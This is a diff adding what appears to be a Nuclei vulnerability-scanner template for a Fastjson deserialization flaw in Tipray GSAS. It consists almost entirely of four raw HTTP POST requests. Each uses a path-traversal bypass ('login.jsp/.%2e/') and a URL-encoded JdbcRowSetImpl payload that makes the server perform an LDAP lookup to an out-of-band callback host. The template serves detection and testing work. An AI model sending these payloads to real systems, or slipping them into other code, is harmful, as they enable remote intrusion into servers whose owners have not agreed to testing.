@@ -1,0 +1,49 @@
+id: poc-yaml-tipray-gsas-updatefileprintparamsd-do-fastjson-deserialization
+info:
+  name: TIPPAY GSAS updateFilePrintParamsD.do Fastjson Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dns,oast
+variables:
+  reverse: '{{interactsh-url}}'
+  random: '{{rand_text_alphanumeric(6)}}'
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/task/updateFilePrintParamsD.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+"ldap://{{reverse}}/{{random}}"%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
+      - |
+        POST /trwfe/login.jsp/.%2e/task/updateFileOutSendParameter.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+"ldap://{{reverse}}/{{random}}"%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
+      - |
+        POST /trwfe/login.jsp/.%2e/task/updateScreenshotParameter.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+"ldap://{{reverse}}/{{random}}"%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
+      - |
+        POST /trwfe/login.jsp/.%2e/task/updateBehaviorCtrlParams.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+"ldap://{{reverse}}/{{random}}"%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Internal Server Error"
+      - type: word
+        part: body
+        words:
+          - "false"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
